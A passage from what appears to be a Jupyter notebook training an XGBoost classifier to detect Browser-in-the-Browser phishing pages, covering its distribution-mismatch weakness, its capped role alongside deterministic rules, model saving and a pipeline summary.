| Most influential feature | `n_pw_inputs` (0.290) |

The defining BitB signal is **twice as common in the benign class**, and the model ranks
it last. The reason is not a bug in the extractor — it is the corpus. Real websites embed
iframes constantly (adverts, video players, maps) while ordinary phishing pages are plain
single-form documents, so within *this* dataset "has an iframe" genuinely does predict
benign. It is only wrong for BitB, where the iframe **is** the attack.

This is a **distribution mismatch**: the model is good at the task it was trained on
(generic phishing) and that task is not the task it is deployed for (BitB). High offline
metrics do not detect this — only scoring real BitB pages does, which is why section 9
exists.

**How the shipped system handles it** — in `core/c2/layer1_bitb.py`:

1. The deterministic rules carry the layer. They encode BitB mechanics directly
   (fixed-position iframes, high z-index overlays, full-viewport coverage,
   drag-prevention, fake address bars, fake window chrome).
2. This model is capped to a **bounded adjustment**:
   `final = min(1.0, heuristic + 0.15 * ml_prob)`. It can refine a rule-based score
   but never override it. The 0.15 ceiling is the headroom the graded test fixtures
   already documented.
3. The decisive-signal floor keys off the **heuristic**, never `ml_prob`.

**The real fix** is to retrain on a BitB-specific corpus rather than a generic phishing
one. Until such a corpus exists, this model stays a supporting signal.

---
## Step 10 — Save Model


In [ ]:
# Save the trained model as a pickle file
# The backend loads this at startup via core/c2/layer1_bitb.py:
#   with open(_MODEL_PATH, 'rb') as f:
#       _bitb_model = pickle.load(f)

MODEL_OUT.parent.mkdir(parents=True, exist_ok=True)
with open(MODEL_OUT, 'wb') as f:
    pickle.dump(model, f)

size_kb = MODEL_OUT.stat().st_size // 1024
print(f'Model saved to : {MODEL_OUT}')
print(f'Model size     : {size_kb} KB')
print()
print('Restart the FastAPI backend to load the new model.')
print('Backend will print: [L1] Loaded trained BitB HTML classifier model')

---
## Summary

| Item | Value |
|------|-------|
| Dataset | Mendeley Phishing Dataset — HTML snapshots |
| Total samples | 30,000 (15k phishing + 15k legitimate), balanced, stratified 80/20 split |
| Features | 16 DOM/style features |
| Model fitted here | XGBoost, 300 trees, depth 6, lr 0.1 (baseline) |
| Model actually shipped | XGBoost, **489 trees, depth 7, lr 0.1053** — from `scripts/tune_models.py` |
| Held-out performance | F1 0.905 · Precision 0.881 · Recall 0.931 · ROC-AUC 0.964 |
| Performance on real BitB pages | Poor — see section 9 |
| Output | `models/bitb_classifier.pkl` |

### How it fits into WebSentinel

```
Browser loads a page
        |
  Playwright captures full DOM (page.content())
        |
  Layer 1 (L1) - BitB Detection          core/c2/layer1_bitb.py
        |
  strip HTML and CSS/JS comments         <-- commented-out markup renders
        |                                    nothing, so it must not score
        +--> 7 deterministic rules  -> heuristic_score
        |
        +--> ML model (this notebook) -> ml_prob
        |
  final_score = min(1.0, heuristic_score + 0.15 * ml_prob)
        |
  15% weight in the six-layer fusion -> risk 0..100 -> verdict
```

The model is a **bounded adjustment, not the score**. It was previously
`max(heuristic_score, ml_prob)`, which let it set the layer score on its own — and
because of the distribution mismatch in section 9, the answers it set were frequently
wrong (0.995 on a benign login page, ~0.05 on real BitB kits).

Two consequences of the change worth noting:

- A benign login page that scored SUSPICIOUS 35.9 now scores **SAFE 28.4**.
- Real BitB kits score **slightly higher** (L1 0.711–0.764 vs 0.700), because an additive
  boost keeps the model's contribution where `max()` discarded it whenever the rules
  already scored higher.

### Reproducing the shipped model

```bash
python scripts/prepare_html_dataset.py   # build data/html_features.csv + baseline model
python scripts/tune_models.py            # RandomizedSearchCV -> tuned models/*.pkl
```

`tune_models.py` backs the previous `.pkl` up to `.pkl.bak` before overwriting, so a
worse retrain can always be rolled back.